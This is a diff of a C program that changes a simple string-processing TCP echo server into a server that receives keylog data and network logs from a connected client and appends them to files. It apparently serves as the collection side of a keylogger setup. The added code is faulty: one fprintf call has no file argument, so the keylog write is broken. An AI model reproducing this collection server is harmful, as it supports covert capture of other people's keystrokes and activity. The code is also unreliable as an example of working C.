@@ -1,50 +1,16 @@
-nclude <stdio.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>      
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <unistd.h>
 
-#include "server.h"
-
-void swap(char* a, char* b) {
-    *a = (*a) ^ (*b);
-    *b = (*a) ^ (*b);
-    *a = (*a) ^ (*b);
-}
-
-void toggle_capitalization(char* ch) {
-    if (*ch >= 97 && *ch <= 122) {
-        // a to z
-        *ch = (*ch) - 32;
-    } else if (*ch >= 65 && *ch <= 90) {
-        // A to Z
-        *ch = (*ch) + 32;
-    }
-}
-
-void reverse_order(char* str) {
-    int len = strlen(str);
-    int idx = 0;
-    for (; idx < len / 2; idx++) {
-        swap(str + idx, str + len - idx - 1);
-    }
-}
-
-void reverse_capitalization(char* str) {
-    int len = strlen(str);
-    int idx = 0;
-    for (; idx < len; idx++) {
-        toggle_capitalization(str + idx);
-    }
-}
-
 int main(int argc , char *argv[])
 {
     // Variables
     int ssock, csock, addrlen, read_size, ret;
     struct sockaddr_in server, client;
-    char message[2000];
+    char message[3000];
     
     short port = 8888;
     
@@ -64,7 +30,7 @@ int main(int argc , char *argv[])
     
     // Bind the socket for the connection
     if (bind(ssock, (struct sockaddr *) &server, sizeof(server)) < 0) {
-        //print the error message
+
         perror("Error binding\n");
         close(ssock);
         exit(0);
@@ -86,21 +52,31 @@ int main(int argc , char *argv[])
     }
     printf("Connection accepted\n");
     
-    memset(message, 0, sizeof(message));
-    // Receive a message from the client. recv() is an alternative for read().
-    // Similarly, send() can replace write().
-    if ((read_size = read(csock, message, sizeof(message))) > 0) {
-        printf("Client: %s\n", message);
-        reverse_order(message);
-        reverse_capitalization(message);
-        printf("After processing: %s\n", message);
-        if ((ret = write(csock, message, strlen(message))) <= 0) {
-            perror("Error writing\n");
-        }
-    } else {
-        perror("Error receiving\n");
-    }
+    memset(message, 0, sizeof(message));  //clear message array
     
+    /*Open keylog files for printing*/
+    FILE *keylog_file = fopen("log/keylog_received.txt", "a");
+    /*Receive a keylog file from the client*/
+    if ((read_size = read(csock, message, sizeof(message))) > 0) {
+        fprintf("%s\n", message);
+    } else {
+        perror("Error receiving keylog log\n");
+    }
+    fclose(keylog_file);
+    
+    memset(message, 0, sizeof(message));  //clear message array
+    /*Open network log file for printing*/
+    FILE *network_log = fopen("log/network_received.txt", "a");
+    /*Receive network log file*/
+    if ((read_size = read(csock, message, sizeof(message))) > 0) {
+        fprintf(network_log,"%s\n", message);
+    } else {
+        perror("Error receiving network log\n");
+    }
+    fclose(network_log);
+    
+    memset(message, 0, sizeof(message));
+    printf("\nLog transfer complete\n");
     
     close(csock);
     close(ssock);
